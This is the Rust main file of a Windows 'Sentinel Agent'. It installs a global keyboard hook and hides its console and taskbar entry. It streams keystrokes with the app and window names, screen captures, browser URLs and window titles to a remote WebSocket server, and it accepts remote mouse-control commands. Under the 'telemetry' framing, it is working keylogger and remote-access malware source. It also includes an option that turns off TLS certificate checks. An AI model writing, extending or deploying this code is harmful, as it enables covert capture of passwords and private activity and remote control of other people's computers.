//! # Sentinel Agent (Windows)
//!
//! Connects to a remote WebSocket server and streams real-time telemetry.
//!
//! ## Startup flow
//!
//! 1. The **main thread** loads the saved configuration, spawns a background
//!    thread that runs a Tokio runtime + the agent WebSocket loop, then runs
//!    an egui/eframe event loop for the settings window (cross-platform).
//!
//! 2. The **background thread** installs the keyboard hook, then runs the
//!    reconnect loop.  Any time the user changes the server URL or agent name
//!    through the settings window, the new `Config` is sent over a
//!    `tokio::sync::watch` channel and the loop reconnects immediately.
//!
//! ## Settings window
//!
//! The process has no taskbar entry.  Press **Ctrl+Shift+F12** to open the
//! settings window.  The ✖ Close button hides the window; only "Exit Agent"
//! terminates the process.
//!
//! ## Outbound frames (agent → server)
//!
//! | Event                        | WS frame type  | JSON `"type"` field |
//! |------------------------------|----------------|---------------------|
//! | Screen frame (on-demand)     | `Binary`       | —                   |
//! | Buffered keystrokes          | `Text` (JSON)  | `"keys"`            |
//! | AFK transition               | `Text` (JSON)  | `"afk"`             |
//! | Return from AFK              | `Text` (JSON)  | `"active"`          |
//! | Foreground window changed    | `Text` (JSON)  | `"window_focus"`    |
//! | Active browser URL changed   | `Text` (JSON)  | `"url"`             |
//!
//! ## Inbound frames (server → agent)
//!
//! | Command          | WS frame type | JSON `"type"` field   |
//! |------------------|---------------|-----------------------|
//! | Start streaming  | `Text` (JSON) | `"start_capture"`     |
//! | Stop streaming   | `Text` (JSON) | `"stop_capture"`      |
//! | Mouse move       | `Text` (JSON) | `"MouseMove"`         |
//! | Mouse click      | `Text` (JSON) | `"MouseClick"`        |

// In release builds: suppress the console window so the agent runs silently.
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod capture;
mod config;
mod input;
mod keylogger;
mod ui;
mod url_scraper;
mod window_tracker;

use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex,
};
use std::time::Duration;

use anyhow::{Context, Result};
use futures_util::{SinkExt, StreamExt};
use input::InputController;
use keylogger::InputEvent;
use tokio::sync::mpsc;
use tokio::time::{interval, MissedTickBehavior};
use tokio_tungstenite::{
    connect_async, connect_async_tls_with_config,
    tungstenite::client::IntoClientRequest,
    tungstenite::{protocol::frame::coding::CloseCode, protocol::CloseFrame, Message},
    Connector, MaybeTlsStream, WebSocketStream,
};
use tracing::{error, info, warn};
use tracing_subscriber::{fmt, EnvFilter};
use window_tracker::WindowTracker;

use config::{AgentStatus, Config};

// ─────────────────────────────────────────────────────────────────────────────
// Tunables
// ─────────────────────────────────────────────────────────────────────────────

/// Maximum frames to deliver per second.
const TARGET_FPS: u64 = 15;
const FRAME_INTERVAL_MS: u64 = 1_000 / TARGET_FPS;

/// How long to wait before attempting a reconnect after a failed session.
const RECONNECT_DELAY_SECS: u64 = 5;

/// Bounded capacity for the JPEG frame channel.
const FRAME_CHANNEL_CAP: usize = 4;

/// Bounded capacity for the outbound WebSocket message channel.
const OUTBOUND_CHANNEL_CAP: usize = 16;

/// How often to poll the foreground window for title/app changes.
const WINDOW_POLL_INTERVAL_MS: u64 = 200;

// ─────────────────────────────────────────────────────────────────────────────
// Entry point  (synchronous — eframe owns the main thread)
// ─────────────────────────────────────────────────────────────────────────────

fn main() {
    // ── Logging ───────────────────────────────────────────────────────────
    //
    // In Windows release builds we run with `windows_subsystem = "windows"`,
    // so there is often no console attached. Write logs to a file under
    // %LOCALAPPDATA%\sentinel\agent.log by default so failures are visible.
    //
    // Override path by setting `AGENT_LOG_FILE` to an absolute path.
    let env_filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));

    let mut log_file_path = std::env::var("AGENT_LOG_FILE")
        .ok()
        .map(std::path::PathBuf::from);
    if log_file_path.is_none() {
        let mut p = config::config_path();
        p.pop(); // .../sentinel
        p.push("agent.log");
        log_file_path = Some(p);
    }

    let _log_guard = if let Some(path) = log_file_path {
        if let Some(parent) = path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        match std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
        {
            Ok(file) => {
                let (writer, guard) = tracing_appender::non_blocking(file);
                fmt()
                    .with_env_filter(env_filter)
                    .with_target(false)
                    .with_thread_ids(false)
                    .compact()
                    .with_writer(writer)
                    .init();
                Some(guard)
            }
            Err(_) => {
                // Last resort (debug builds / console runs)
                fmt()
                    .with_env_filter(env_filter)
                    .with_target(false)
                    .with_thread_ids(false)
                    .compact()
                    .init();
                None
            }
        }
    } else {
        fmt()
            .with_env_filter(env_filter)
            .with_target(false)
            .with_thread_ids(false)
            .compact()
            .init();
        None
    };

    info!("Sentinel agent v{}", env!("CARGO_PKG_VERSION"));

    // Allow forcing the settings UI to show on startup. This is helpful on
    // Windows where the app has no taskbar entry and is otherwise "invisible"
    // until the global hotkey is pressed.
    let show_ui_on_startup = std::env::args().any(|a| a == "--show-ui")
        || std::env::var("AGENT_SHOW_UI")
            .map(|v| {
                matches!(
                    v.trim(),
                    "1" | "true" | "TRUE" | "yes" | "YES" | "on" | "ON"
                )
            })
            .unwrap_or(false);

    // Allow disabling the UI entirely (headless mode). Useful when running the
    // agent as a scheduled task / service where a window surface cannot be created.
    let no_ui = std::env::args().any(|a| a == "--no-ui")
        || std::env::var("AGENT_NO_UI")
            .map(|v| {
                matches!(
                    v.trim(),
                    "1" | "true" | "TRUE" | "yes" | "YES" | "on" | "ON"
                )
            })
            .unwrap_or(false);

    // Allow connecting to WSS endpoints with invalid/untrusted certificates.
    // This is NOT safe for production, but can help when TLS is misconfigured.
    let insecure_tls = std::env::args().any(|a| a == "--insecure-tls")
        || std::env::var("AGENT_INSECURE_TLS")
            .map(|v| {
                matches!(
                    v.trim(),
                    "1" | "true" | "TRUE" | "yes" | "YES" | "on" | "ON"
                )
            })
            .unwrap_or(false);

    // ── Load persisted configuration ──────────────────────────────────────
    let initial_config = config::load_config();
    info!("Config loaded from {:?}", config::config_path());

    // ── Shared agent status (agent thread writes, GUI thread reads) ───────
    let agent_status: Arc<Mutex<AgentStatus>> = Arc::new(Mutex::new(AgentStatus::Disconnected));

    // ── Config watch channel (GUI thread writes, agent thread reads) ──────
    let initial_watch = if initial_config.server_url.is_empty() {
        None
    } else {
        Some(initial_config.clone())
    };
    let (config_tx, config_rx) = tokio::sync::watch::channel(initial_watch);

    // ── Synchronisation: wait for the keylogger hook to be installed ──────
    let (ready_tx, ready_rx) = std::sync::mpsc::channel::<anyhow::Result<()>>();

    // ── Background thread: Tokio runtime + agent WebSocket loop ──────────
    let status_bg = agent_status.clone();
    std::thread::Builder::new()
        .name("agent-runtime".into())
        .spawn(move || {
            let rt = tokio::runtime::Builder::new_multi_thread()
                .enable_all()
                .build()
                .expect("Failed to build Tokio runtime");

            rt.block_on(async move {
                // Keylogger channels must be created inside the async context
                // because keylogger::start() spawns a tokio task internally.
                let (key_tx, key_rx) = mpsc::unbounded_channel::<InputEvent>();
                match keylogger::start(key_tx) {
                    Ok(()) => {
                        info!("Keyboard hook installed.");
                        let _ = ready_tx.send(Ok(()));
                    }
                    Err(e) => {
                        let _ = ready_tx.send(Err(anyhow::anyhow!("{e:#}")));
                        return; // Cannot continue without keylogger
                    }
                }

                let (frame_tx, frame_rx) = mpsc::channel::<Vec<u8>>(FRAME_CHANNEL_CAP);
                run_agent_loop(
                    config_rx,
                    frame_tx,
                    frame_rx,
                    key_rx,
                    status_bg,
                    insecure_tls,
                )
                .await;
            });
        })
        .expect("Failed to spawn agent thread");

    // Block until the keylogger hook is ready (or failed)
    match ready_rx.recv() {
        Ok(Ok(())) => {}
        Ok(Err(e)) => warn!("Keylogger failed to start: {e:#}"),
        Err(_) => warn!("Agent thread exited before keylogger was ready"),
    }

    if no_ui {
        info!("UI disabled (--no-ui / AGENT_NO_UI). Running headless.");
        loop {
            std::thread::sleep(Duration::from_secs(60));
        }
    } else {
        // ── egui settings window (main thread; eframe owns the event loop) ───
        let _ = ui::AgentApp::new(initial_config, config_tx, agent_status)
            .with_show_on_startup(show_ui_on_startup)
            .run();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Agent loop with hot-reload of config
// ─────────────────────────────────────────────────────────────────────────────

async fn run_agent_loop(
    mut config_rx: tokio::sync::watch::Receiver<Option<Config>>,
    frame_tx: mpsc::Sender<Vec<u8>>,
    mut frame_rx: mpsc::Receiver<Vec<u8>>,
    mut key_rx: mpsc::UnboundedReceiver<InputEvent>,
    status: Arc<Mutex<AgentStatus>>,
    insecure_tls: bool,
) {
    // The capture stop-flag survives reconnects.
    let mut capture_stop: Option<Arc<AtomicBool>> = None;

    loop {
        // Snapshot current config (clears the "changed" flag too)
        let cfg_opt = config_rx.borrow_and_update().clone();

        match cfg_opt {
            None => {
                set_status(&status, AgentStatus::Disconnected);
                info!("No server URL configured – waiting for settings…");
                if config_rx.changed().await.is_err() {
                    return; // watch sender dropped = app exiting
                }
                continue;
            }
            Some(ref cfg) if cfg.server_url.is_empty() => {
                set_status(&status, AgentStatus::Disconnected);
                info!("Server URL is empty – waiting for settings…");
                if config_rx.changed().await.is_err() {
                    return;
                }
                continue;
            }
            Some(cfg) => {
                let ws_url = build_ws_url(&cfg);
                set_status(&status, AgentStatus::Connecting);
                info!("Connecting to {ws_url} …");
                info!("Target FPS (streaming): {TARGET_FPS}");

                match connect_ws(&ws_url, insecure_tls).await {
                    Ok((ws_stream, response)) => {
                        set_status(&status, AgentStatus::Connected);
                        info!("WebSocket connected (HTTP {}).", response.status().as_u16());
                        match run_session(
                            ws_stream,
                            &frame_tx,
                            &mut frame_rx,
                            &mut key_rx,
                            &mut capture_stop,
                        )
                        .await
                        {
                            Ok(()) => info!("Session closed gracefully."),
                            Err(e) => error!("Session error: {e:#}"),
                        }

                        // Stop the capture thread on every session end so it
                        // never bleeds into the next reconnect without an
                        // explicit start_capture from the server.
                        if let Some(stop) = capture_stop.take() {
                            stop.store(true, Ordering::Relaxed);
                            info!("Screen capture stopped (session ended).");
                        }

                        set_status(&status, AgentStatus::Disconnected);
                    }
                    Err(e) => {
                        set_status(&status, AgentStatus::Error(e.to_string()));
                        error!("Connection failed: {e:#}");
                    }
                }

                // Wait before reconnect; wake early if the user updates config
                info!("Reconnecting in {RECONNECT_DELAY_SECS}s …");
                tokio::select! {
                    _ = tokio::time::sleep(Duration::from_secs(RECONNECT_DELAY_SECS)) => {}
                    _ = config_rx.changed() => {
                        info!("Config changed – applying new settings immediately.");
                    }
                }
            }
        }
    }
}

async fn connect_ws(
    ws_url: &str,
    insecure_tls: bool,
) -> Result<(
    WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
    tokio_tungstenite::tungstenite::handshake::client::Response,
)> {
    if insecure_tls && ws_url.trim_start().starts_with("wss://") {
        warn!("TLS verification is DISABLED for this connection (--insecure-tls / AGENT_INSECURE_TLS).");
        // native-tls: accept invalid certs/hostnames (dangerous; debugging only).
        let mut builder = native_tls::TlsConnector::builder();
        builder.danger_accept_invalid_certs(true);
        builder.danger_accept_invalid_hostnames(true);
        let tls = builder
            .build()
            .context("Failed to build native-tls connector")?;

        let req = ws_url
            .into_client_request()
            .context("Invalid WebSocket URL")?;
        return Ok(connect_async_tls_with_config(
            req,
            None,
            false,
            Some(Connector::NativeTls(tls)),
        )
        .await
        .context("WebSocket connect failed")?);
    }

    Ok(connect_async(ws_url)
        .await
        .context("WebSocket connect failed")?)
}

// ─────────────────────────────────────────────────────────────────────────────
// Session driver  (unchanged from original)
// ─────────────────────────────────────────────────────────────────────────────

async fn run_session(
    ws_stream: WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
    frame_tx: &mpsc::Sender<Vec<u8>>,
    frame_rx: &mut mpsc::Receiver<Vec<u8>>,
    key_rx: &mut mpsc::UnboundedReceiver<InputEvent>,
    capture_stop: &mut Option<Arc<AtomicBool>>,
) -> Result<()> {
    let (mut ws_tx, mut ws_rx) = ws_stream.split();

    // ── Outbound message bus ──────────────────────────────────────────────
    let (out_tx, mut out_rx) = mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAP);

    let writer_handle = tokio::spawn(async move {
        while let Some(msg) = out_rx.recv().await {
            if let Err(e) = ws_tx.send(msg).await {
                warn!("WS write error (writer exiting): {e}");
                break;
            }
        }
        let _ = ws_tx
            .send(Message::Close(Some(CloseFrame {
                code: CloseCode::Normal,
                reason: "agent shutting down".into(),
            })))
            .await;
        let _ = ws_tx.close().await;
    });

    // ── Input controller ──────────────────────────────────────────────────
    let mut controller = InputController::new().context("Failed to create input controller")?;

    // ── Window focus tracker ──────────────────────────────────────────────
    let mut win_tracker = WindowTracker::new();

    // ── Timers ────────────────────────────────────────────────────────────
    let mut frame_ticker = interval(Duration::from_millis(FRAME_INTERVAL_MS));
    let mut url_ticker = interval(Duration::from_secs(2));
    let mut window_ticker = interval(Duration::from_millis(WINDOW_POLL_INTERVAL_MS));

    frame_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
    url_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
    window_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);

    // ── Event loop ────────────────────────────────────────────────────────
    let result: Result<()> = loop {
        tokio::select! {
            biased;

            // ── Branch 1: inbound server commands ────────────────────────
            msg = ws_rx.next() => {
                match msg {
                    Some(Ok(Message::Text(text))) => {
                        handle_server_command(
                            &text,
                            frame_tx,
                            capture_stop,
                            &mut controller,
                        );
                    }
                    Some(Ok(Message::Close(frame))) => {
                        let reason = frame.as_ref()
                            .map(|f| f.reason.as_ref())
                            .unwrap_or("no reason");
                        info!("Server sent Close frame: {reason}");
                        break Ok(());
                    }
                    Some(Ok(Message::Ping(_))) | Some(Ok(Message::Pong(_))) => {}
                    Some(Ok(_)) => {}
                    Some(Err(e)) => break Err(anyhow::anyhow!("WS receive error: {e}")),
                    None => {
                        info!("WebSocket stream ended.");
                        break Ok(());
                    }
                }
            }

            // ── Branch 2: screen frame delivery ──────────────────────────
            _ = frame_ticker.tick() => {
                let mut latest: Option<Vec<u8>> = None;
                while let Ok(jpeg) = frame_rx.try_recv() {
                    latest = Some(jpeg);
                }
                if let Some(jpeg) = latest {
                    if out_tx.send(Message::Binary(jpeg)).await.is_err() {
                        break Err(anyhow::anyhow!(
                            "Outbound channel closed; writer task exited unexpectedly."
                        ));
                    }
                }
            }

            // ── Branch 3: active browser URL ─────────────────────────────
            _ = url_ticker.tick() => {
                if let Some(info) = url_scraper::get_active_url() {
                    let payload = serde_json::json!({
                        "type"    : "url",
                        "url"     : info.url,
                        "title"   : info.title,
                        "browser" : info.browser_name,
                        "ts"      : unix_timestamp_secs(),
                    })
                    .to_string();
                    if out_tx.send(Message::Text(payload)).await.is_err() {
                        break Err(anyhow::anyhow!(
                            "Outbound channel closed; writer task exited unexpectedly."
                        ));
                    }
                }
            }

            // ── Branch 4: keystrokes / AFK ───────────────────────────────
            event = key_rx.recv() => {
                let payload = match event {
                    Some(InputEvent::Keys { text, app, window, ts }) => {
                        serde_json::json!({
                            "type"   : "keys",
                            "text"   : text,
                            "app"    : app,
                            "window" : window,
                            "ts"     : ts,
                        })
                        .to_string()
                    }
                    Some(InputEvent::Afk { idle_secs }) => {
                        serde_json::json!({
                            "type"     : "afk",
                            "idle_secs": idle_secs,
                            "ts"       : unix_timestamp_secs(),
                        })
                        .to_string()
                    }
                    Some(InputEvent::Active) => {
                        serde_json::json!({
                            "type": "active",
                            "ts"  : unix_timestamp_secs(),
                        })
                        .to_string()
                    }
                    None => break Ok(()),
                };
                if out_tx.send(Message::Text(payload)).await.is_err() {
                    break Err(anyhow::anyhow!(
                        "Outbound channel closed; writer task exited unexpectedly."
                    ));
                }
            }

            // ── Branch 5: foreground window changes ───────────────────────
            _ = window_ticker.tick() => {
                if let Some(event) = win_tracker.poll() {
                    let payload = serde_json::json!({
                        "type"  : "window_focus",
                        "title" : event.title,
                        "app"   : event.app,
                        "hwnd"  : event.hwnd,
                        "ts"    : unix_timestamp_secs(),
                    })
                    .to_string();
                    if out_tx.send(Message::Text(payload)).await.is_err() {
                        break Err(anyhow::anyhow!(
                            "Outbound channel closed; writer task exited unexpectedly."
                        ));
                    }
                }
            }
        }
    };

    // ── Shutdown ──────────────────────────────────────────────────────────
    drop(out_tx);
    if let Err(e) = writer_handle.await {
        warn!("Writer task panicked: {e}");
    }

    result
}

// ─────────────────────────────────────────────────────────────────────────────
// Server command handler
// ─────────────────────────────────────────────────────────────────────────────

fn handle_server_command(
    text: &str,
    frame_tx: &mpsc::Sender<Vec<u8>>,
    capture_stop: &mut Option<Arc<AtomicBool>>,
    controller: &mut InputController,
) {
    let val: serde_json::Value = match serde_json::from_str(text) {
        Ok(v) => v,
        Err(_) => return,
    };

    match val["type"].as_str().unwrap_or("") {
        "start_capture" => {
            if capture_stop.is_none() {
                let stop = Arc::new(AtomicBool::new(false));
                match capture::start_capture(frame_tx.clone(), stop.clone()) {
                    Ok(()) => {
                        *capture_stop = Some(stop);
                        info!("Screen capture started (viewer connected).");
                    }
                    Err(e) => warn!("Failed to start capture: {e}"),
                }
            }
        }
        "stop_capture" => {
            if let Some(stop) = capture_stop.take() {
                stop.store(true, Ordering::Relaxed);
                info!("Screen capture stopped (no viewers remaining).");
            }
        }
        _ => {
            if let Err(e) = controller.handle_command(text) {
                warn!("Control command error: {e:#}");
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Build the full WebSocket URL, appending `?name=<agent_name>` and (optionally)
/// `&secret=<agent_password>` for server-side agent authentication.
fn build_ws_url(cfg: &Config) -> String {
    let base = cfg.server_url.trim_end_matches('/');
    let mut url = base.to_string();

    // Note: we intentionally do minimal encoding here because the UI expects a
    // copy/paste-friendly value. Use URL-safe secrets (base64/hex) in prod.
    let mut first_param = !url.contains('?');

    if !cfg.agent_name.is_empty() {
        url.push(if first_param { '?' } else { '&' });
        first_param = false;
        url.push_str("name=");
        url.push_str(cfg.agent_name.trim());
    }

    if !cfg.agent_password.is_empty() {
        url.push(if first_param { '?' } else { '&' });
        url.push_str("secret=");
        url.push_str(cfg.agent_password.trim());
    }

    url
}

/// Write to the shared status mutex, ignoring lock-poison errors.
fn set_status(status: &Mutex<AgentStatus>, s: AgentStatus) {
    if let Ok(mut guard) = status.lock() {
        *guard = s;
    }
}

#[inline]
fn unix_timestamp_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}
